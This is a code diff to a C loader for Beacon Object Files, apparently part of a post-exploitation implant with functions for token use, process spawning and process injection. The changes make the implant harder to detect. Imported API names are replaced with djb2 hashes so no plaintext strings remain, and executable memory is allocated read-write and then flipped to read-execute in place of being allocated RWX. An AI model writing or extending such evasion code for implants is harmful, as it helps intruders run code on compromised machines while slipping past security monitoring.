@@ -219,32 +219,40 @@ static void BeaconInjectTemporaryProcess(PROCESS_INFORMATION *pi, char *payload,
     CloseHandle(pi->hProcess);
 }
 
-/* ── External symbol resolution ──────────────────────────── */
+/* ── External symbol resolution (hash-based, no plaintext) ─ */
 
-typedef struct { const char *name; PVOID addr; } bof_api_entry;
+static UINT32 bof_djb2(const char *str) {
+    UINT32 h = 5381;
+    int c;
+    while ((c = *str++))
+        h = ((h << 5) + h) + (UINT32)c;
+    return h;
+}
+
+typedef struct { UINT32 hash; PVOID addr; } bof_api_entry;
 
 static const bof_api_entry g_beacon_api[] = {
-    { "BeaconDataParse",              (PVOID)BeaconDataParse },
-    { "BeaconDataInt",                (PVOID)BeaconDataInt },
-    { "BeaconDataShort",              (PVOID)BeaconDataShort },
-    { "BeaconDataLength",             (PVOID)BeaconDataLength },
-    { "BeaconDataExtract",            (PVOID)BeaconDataExtract },
-    { "BeaconOutput",                 (PVOID)BeaconOutput },
-    { "BeaconPrintf",                 (PVOID)BeaconPrintf },
-    { "BeaconUseToken",               (PVOID)BeaconUseToken },
-    { "BeaconRevertToken",            (PVOID)BeaconRevertToken },
-    { "BeaconIsAdmin",                (PVOID)BeaconIsAdmin },
-    { "BeaconGetSpawnTo",             (PVOID)BeaconGetSpawnTo },
-    { "BeaconSpawnTemporaryProcess",  (PVOID)BeaconSpawnTemporaryProcess },
-    { "BeaconInjectProcess",          (PVOID)BeaconInjectProcess },
-    { "BeaconInjectTemporaryProcess", (PVOID)BeaconInjectTemporaryProcess },
-    { NULL, NULL }
+    { 0xE2494BA2u, (PVOID)BeaconDataParse },
+    { 0xAF1AFDD2u, (PVOID)BeaconDataInt },
+    { 0xE2835EF7u, (PVOID)BeaconDataShort },
+    { 0x22641D29u, (PVOID)BeaconDataLength },
+    { 0x80D46722u, (PVOID)BeaconDataExtract },
+    { 0x6DF4B81Eu, (PVOID)BeaconOutput },
+    { 0x700D8660u, (PVOID)BeaconPrintf },
+    { 0x889E48BBu, (PVOID)BeaconUseToken },
+    { 0xF2744BA6u, (PVOID)BeaconRevertToken },
+    { 0x566264D2u, (PVOID)BeaconIsAdmin },
+    { 0x1E7C9FB9u, (PVOID)BeaconGetSpawnTo },
+    { 0xD6C57438u, (PVOID)BeaconSpawnTemporaryProcess },
+    { 0x0EA75B09u, (PVOID)BeaconInjectProcess },
+    { 0x9E22498Cu, (PVOID)BeaconInjectTemporaryProcess },
+    { 0, NULL }
 };
 
-/* Resolve a BOF import: BeaconFuncName or LIBRARY$FuncName */
 static PVOID resolve_bof_import(const char *name) {
-    for (int i = 0; g_beacon_api[i].name; i++) {
-        if (strcmp(name, g_beacon_api[i].name) == 0)
+    UINT32 h = bof_djb2(name);
+    for (int i = 0; g_beacon_api[i].addr; i++) {
+        if (h == g_beacon_api[i].hash)
             return g_beacon_api[i].addr;
     }
 
@@ -345,7 +353,7 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
 
     BYTE *codeBlock = (BYTE *)VirtualAlloc(NULL, totalSize,
                                            MEM_COMMIT | MEM_RESERVE,
-                                           PAGE_EXECUTE_READWRITE);
+                                           PAGE_READWRITE);
     if (!codeBlock) return -1;
 
     /* ─── Phase 3: Map sections into the block ─── */
@@ -465,9 +473,12 @@ static int bof_exec(const unsigned char *bof_data, size_t bof_len,
         }
     }
 
-    /* ─── Phase 5: Find and call "go" entry point ─── */
+    /* ─── Phase 5: Flip RW → RX, find and call "go" entry point ─── */
 
     if (loadOk) {
+        DWORD oldProt;
+        VirtualProtect(codeBlock, totalSize, PAGE_EXECUTE_READ, &oldProt);
+
         PVOID entryPoint = NULL;
         for (DWORD s = 0; s < hdr->NumberOfSymbols; s++) {
             const char *sn = coff_symbol_name(&symTab[s], strTab);
